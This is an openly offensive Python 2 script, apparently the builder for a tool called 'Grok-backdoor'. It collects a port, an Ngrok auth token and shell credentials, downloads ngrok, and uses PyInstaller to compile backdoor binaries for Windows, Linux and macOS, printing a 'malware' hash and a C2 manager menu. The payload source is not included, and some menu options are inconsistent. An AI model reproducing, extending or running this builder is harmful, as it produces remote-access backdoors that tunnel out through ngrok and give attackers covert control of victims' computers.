#!/usr/bin/python
from urllib import urlopen
import ConfigParser
from os import system, path
from platform import system as systemos
from wget import download
import zipfile
import hashlib
import random
import os
import subprocess
import time
"""
Grok-backdoor.
Author : Deepu TV - twitter.com/deepzec 
"""

ostype = systemos().lower()
cfgfile = 'conf.ini'

RED, WHITE, CYAN, GREEN, END = '\033[91m', '\33[46m', '\033[36m', '\033[1;32m', '\033[0m'


def connected(host='http://duckduckgo.com'):

    try:
        urlopen(host)
        return True
    except:
        return False


def extractWin(filename):
    ngrok_zip= zipfile.ZipFile(filename)
    ngrok_zip.extract('ngrok.exe')
    system('mkdir bin')
    system('move ngrok.exe bin/')
    ngrok_zip.close()
    os.remove(filename)


def Ngrok_Download(ostype):
    filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
    url = 'https://bin.equinox.io/c/4VmDzA7iaHb/' + filename
    download(url)


def checkNgrok():
    if path.isdir('bin/') == False:
        print '[*] Downloading Ngrok...'
        Ngrok_Download(ostype)
        filename = 'ngrok-stable-{0}-386.zip'.format(ostype)
        if ostype == 'windows':
            extractWin(filename)

        else:
            system('unzip ' + filename)
            system('mkdir bin')
            system('mv ngrok bin/ngrok')
            system('rm -Rf ' + filename)
            system('clear')


def listenerConf():
    ListnerPort = raw_input("\nPlease enter the port to bind:\n\n Option >  ".format(RED, END))
    NgrokAuth = raw_input("\nPlease enter Ngrok auth code:\n\n Option >  ".format(RED, END))
    shell_user = raw_input("\nPlease enter username for connecting to shell:\n\n Option >  ".format(RED, END))
    shell_pass = raw_input("\nPlease enter password for connecting to shell:\n\n Option >  ".format(RED, END))
    randomNum = random.random()
    
    conf = open(cfgfile, 'a')
    Config = ConfigParser.ConfigParser()
    Config.add_section('Bind')
    Config.set('Bind', 'port', ListnerPort)
    Config.set('Bind', 'NgAuth', NgrokAuth)
    Config.set('Bind', 'user', shell_user)
    Config.set('Bind', 'password', shell_pass)
    Config.set('Bind', 'random', randomNum)
    Config.write(conf)
    conf.close()

def pybinary(option):
    print('Compiling backdoor binary using Pyinstaller...')
    subprocess.Popen(['pyinstaller', option], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    time.sleep(10)
    print('Successfully compiled malware binary to dist\server.exe')
    if os.path.isfile('.\dist\server.exe'):
        file = ".\dist\server.exe"
    else:
        file = "./dist/server"
    BLOCK_SIZE = 65536
    file_hash = hashlib.sha256()
    with open(file, 'rb') as f:
        fb = f.read(BLOCK_SIZE)
        while len(fb) > 0:
            file_hash.update(fb)
            fb = f.read(BLOCK_SIZE)
    print ('Malware Hahs:')
    print (file_hash.hexdigest())
    

def pyinstaller_compile(ostype, status):
    if ostype == 'linux':
        if status == True:
            pybinary('server_ndl.spec')

        else:
            pybinary('server_linux.spec')

    elif ostype == 'windows':

        if status == True:
            pybinary('server_ndl.spec')

        else:
            pybinary('server_windows.spec')

    elif ostype == 'darwin':
        if status == True:
            pybinary('server_ndl.spec')

        else:
            pybinary('server_linux.spec')


def Ngrok_Download_Conf(status,platform):

    conf = open(cfgfile, 'w')
    Config = ConfigParser.ConfigParser()
    Config.add_section('Download')
    Config.set('Download', 'downloads', status)
    Config.set('Download', 'Platform', platform)
    Config.write(conf)
    conf.close()
    listenerConf()
    pyinstaller_compile(ostype, status)


def NgrokDownload(platform):
    user_input = raw_input("\nDo you want to download Ngrok executable during backdoor execution?(Y/N):\n\nOption >  ".format(GREEN, END)).upper()
    if user_input == 'Y':
        Ngrok_Download_Conf(True, platform)

    else:
        print("We will bind ngrok binary with the backdoor..\n\n")
        Ngrok_Download_Conf(False, platform)


def PlatformWindows():
    platform = 'windows'
    NgrokDownload(platform)


def PlatformLinux():
    platform = 'linux'
    NgrokDownload(platform)


def PlatformMac():
    platform = 'darwin'
    NgrokDownload(platform)


if __name__ == "__main__":
    try:
        if connected() == False:
            print ("Network connection error")
            exit(0)

        else:
            checkNgrok()
            if ostype =='windows':
                
                print ("""================================================================================
           ___           _           ___            _       _                  
          / _ \_ __ ___ | | __      / __\ __ _  ___| | ____| | ___   ___  _ __ 
         / /_\/ '__/ _ \| |/ /____ /__\/// _` |/ __| |/ / _` |/ _ \ / _ \| '__|
        / /_\\| | | (_) |   <_____/ \/  \ (_| | (__|   < (_| | (_) | (_) | |   
        \____/|_|  \___/|_|\_\    \_____/\__,_|\___|_|\_\__,_|\___/ \___/|_|

        Report bugs to Deepu TV - twitter.com/deepzec""" )
                
                option = raw_input("\nSelect an option:\n\n[1]Create a windows backdoor\n\n[4]C2 manager\n\n  Option >  ".format(CYAN, END))
                

            elif ostype == 'linux':

                print ("""================================================================================
           ___           _           ___            _       _                  
          / _ \_ __ ___ | | __      / __\ __ _  ___| | ____| | ___   ___  _ __ 
         / /_\/ '__/ _ \| |/ /____ /__\/// _` |/ __| |/ / _` |/ _ \ / _ \| '__|
        / /_\\| | | (_) |   <_____/ \/  \ (_| | (__|   < (_| | (_) | (_) | |   
        \____/|_|  \___/|_|\_\    \_____/\__,_|\___|_|\_\__,_|\___/ \___/|_|

        Report bugs to Deepu TV - twitter.com/deepzec""" )
                option = raw_input("\nSelect an option:\n\n[2]Create a Linux backdoor\n\n[43]C2 manager\n\n  Option >  ".format(CYAN, END))
            elif ostype == 'darwin':

                print ("""================================================================================
           ___           _           ___            _       _                  
          / _ \_ __ ___ | | __      / __\ __ _  ___| | ____| | ___   ___  _ __ 
         / /_\/ '__/ _ \| |/ /____ /__\/// _` |/ __| |/ / _` |/ _ \ / _ \| '__|
        / /_\\| | | (_) |   <_____/ \/  \ (_| | (__|   < (_| | (_) | (_) | |   
        \____/|_|  \___/|_|\_\    \_____/\__,_|\___|_|\_\__,_|\___/ \___/|_|

        Report bugs to Deepu TV - twitter.com/deepzec""" )
                option = raw_input("\nSelect an option:\n\n[3]Create a Mac backdoor\n\n[4]C2 manager\n\n  Option >  ".format(CYAN, END))

#            option = raw_input("\nSelect an option:\n\n[1]Create a windows backdoor\n\n[2]Create a Linux backdoor\n\n[3]C2 manager\n\n  SF >  ".format(CYAN, END))
            if option == '1':
                PlatformWindows()

            elif option == '2':
                PlatformLinux()

            elif option == '3':
                PlatformMac()

            elif option == '4':
                print("Yet to implement this feature")

    except KeyboardInterrupt:
        exit(0)
